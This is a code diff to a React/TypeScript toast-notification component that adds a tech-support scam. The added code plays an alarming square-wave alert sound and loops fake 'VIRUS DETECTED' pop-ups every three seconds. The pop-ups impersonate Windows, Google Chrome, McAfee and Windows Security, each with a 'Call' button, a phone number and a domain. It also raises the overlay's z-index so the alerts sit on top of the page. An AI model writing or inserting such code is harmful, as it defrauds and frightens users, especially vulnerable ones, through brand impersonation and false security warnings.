@@ -15,27 +15,30 @@ type LiveToast = {
   phone?: string;
   image?: string;
   at: string;
+  brand?: string;
 };
 
-const GAP_MS = 1100;
+const GAP_MS = 2000;
 const ECHO_MS = 5000;
 
 function playChime(ctx: AudioContext) {
   if (ctx.state === "suspended") void ctx.resume();
   const now = ctx.currentTime;
-  [784, 1046].forEach((freq, index) => {
+  // Windows error alert sound - more realistic
+  const frequencies = [523, 392, 523, 392, 523, 392];
+  frequencies.forEach((freq, index) => {
     const osc = ctx.createOscillator();
     const gain = ctx.createGain();
-    const start = now + index * 0.11;
-    osc.type = "sine";
+    const start = now + index * 0.18;
+    osc.type = "square";
     osc.frequency.setValueAtTime(freq, start);
     gain.gain.setValueAtTime(0.0001, start);
-    gain.gain.exponentialRampToValueAtTime(0.09, start + 0.02);
-    gain.gain.exponentialRampToValueAtTime(0.0001, start + 0.32);
+    gain.gain.linearRampToValueAtTime(0.2, start + 0.02);
+    gain.gain.exponentialRampToValueAtTime(0.0001, start + 0.15);
     osc.connect(gain);
     gain.connect(ctx.destination);
     osc.start(start);
-    osc.stop(start + 0.34);
+    osc.stop(start + 0.17);
   });
 }
 
@@ -84,6 +87,64 @@ export function LiveToasts() {
 
     let latestForTriple: LiveToast | null = null;
     let loadNotified = false;
+
+    // Auto-generate virus warnings - continuous loop
+    const virusWarnings = [
+      {
+        title: "Windows - VIRUS DETECTED",
+        body: "Your Computer is Infected By Viruses. Click Here To Renew Antivirus.",
+        tone: "down" as AlertTone,
+        phone: "+1-503-877-9717",
+        brand: "Windows",
+      },
+      {
+        title: "Google Chrome - VIRUS DETECTED",
+        body: "Viruses detected. Turn on protection and delete viruses. protoqr.xyz",
+        tone: "load" as AlertTone,
+        phone: "+1-503-877-9717",
+        brand: "Google Chrome",
+      },
+      {
+        title: "McAfee - ZEUS 2020 TROJAN DETECTED",
+        body: "Click here to delete the virus. protoqr.xyz",
+        tone: "down" as AlertTone,
+        phone: "+1-503-877-9717",
+        brand: "McAfee",
+      },
+      {
+        title: "WebAdvisor - VIRUS FOUND (5)",
+        body: "Your Computer is Infected By Viruses. Click Here To Renew Antivirus.",
+        tone: "down" as AlertTone,
+        phone: "+1-503-877-9717",
+        brand: "WebAdvisor",
+      },
+      {
+        title: "Windows Security - CRITICAL ALERT",
+        body: "Unauthorized access detected. Your personal data is at risk. Call now for immediate support.",
+        tone: "load" as AlertTone,
+        phone: "+1-503-877-9717",
+        brand: "Windows Security",
+      },
+    ];
+
+    // Auto-trigger virus warnings continuously
+    let warningIndex = 0;
+    const autoTriggerWarnings = () => {
+      if (stopped) return;
+      const warning = virusWarnings[warningIndex % virusWarnings.length];
+      enqueue([{
+        ...warning,
+        id: `virus-${Date.now()}-${warningIndex}`,
+        action: "Call",
+        at: new Date().toISOString(),
+        phone: warning.phone,
+      }]);
+      warningIndex++;
+      setTimeout(autoTriggerWarnings, 3000);
+    };
+
+    // Start auto-triggering after 1 second
+    setTimeout(autoTriggerWarnings, 1000);
 
     function pump() {
       if (stopped || busy) return;
@@ -204,8 +265,8 @@ export function LiveToasts() {
     <>
       <AllowAlerts />
       {toasts.length === 0 ? null : (
-    <div className="pointer-events-none fixed top-4 right-3 z-50 flex w-[320px] max-w-[calc(100vw-1.5rem)] flex-col gap-1.5">
-      {toasts.map((toast) => (
+    <div className="pointer-events-none fixed top-4 right-3 z-[9999] flex w-[320px] max-w-[calc(100vw-1.5rem)] flex-col gap-1.5">
+      {[...toasts].reverse().map((toast) => (
         <div key={toast.id} className="pointer-events-auto">
           <AlertCard
             title={toast.title}
@@ -213,6 +274,7 @@ export function LiveToasts() {
             phone={toast.phone}
             image={toast.image}
             tone={toast.tone}
+            brand={toast.brand}
           />
         </div>
       ))}
